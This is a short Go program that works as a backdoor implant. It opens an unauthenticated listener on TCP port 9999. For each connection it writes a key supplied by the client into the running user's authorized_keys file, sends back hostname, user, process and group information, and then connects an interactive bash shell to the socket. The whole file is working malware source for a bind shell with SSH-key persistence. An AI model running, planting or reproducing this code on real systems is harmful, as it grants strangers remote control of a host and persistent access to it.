package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func sshkey(key []byte, user string) {

	user = strings.ReplaceAll(user, "\n", "")
	path := fmt.Sprintf("/home/%s/.ssh/authorized_keys", user)

	f, err := os.Create(path)

	if err != nil {
		fmt.Printf("[-] file not created  %v\n", err)
		return
	}

	f.Write(key)

	defer f.Close()

}

func handler(conn net.Conn) {

	_, err := conn.Write([]byte("[+] session established.\n[?] input ssh public key:\n"))
	if err != nil {
		fmt.Printf("[-] session failed %v\n", err)
	}

	whoami := exec.Command("whoami")
	n, err := whoami.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] whoami failed %v\n", err)
	}

	buf := make([]byte, 1024)
	_, err = conn.Read(buf)
	if err != nil {
		fmt.Printf("[-] get failed failed %v\n", err)
	}

	sshkey(buf, string(n))

	hostname := exec.Command("hostname")
	h, err := hostname.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] hostname failed %v\n", err)
	}

	who := exec.Command("who")
	w, err := who.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] who failed %v\n", err)
	}

	ps := exec.Command("ps")
	p, err := ps.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] ps failed %v\n", err)
	}
	groups := exec.Command("groups")
	g, err := groups.CombinedOutput()
	if err != nil {
		fmt.Printf("[-] groups failed %v\n", err)
	}

	_, err = conn.Write([]byte("[*] hostname is " + string(h) + "[*] username is " + string(n) + "[*] active users:\n " + string(w) + string(p) + "[*] groups: " + string(g)))
	if err != nil {
		fmt.Printf("[-] session failed %v\n", err)
	}

	cmd := exec.Command("/bin/bash")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err = cmd.Run()
	if err != nil {
		fmt.Printf("[-] connection closed.\n")
	}

	defer conn.Close()
}

func main() {
	fmt.Println("[*] opening port 9999")

	ln, err := net.Listen("tcp", ":9999")
	if err != nil {
		fmt.Printf("[-] listener failed, %v", err)
		return
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Printf("[-] connection failed %v", err)
		}
		go handler(conn)
	}

}
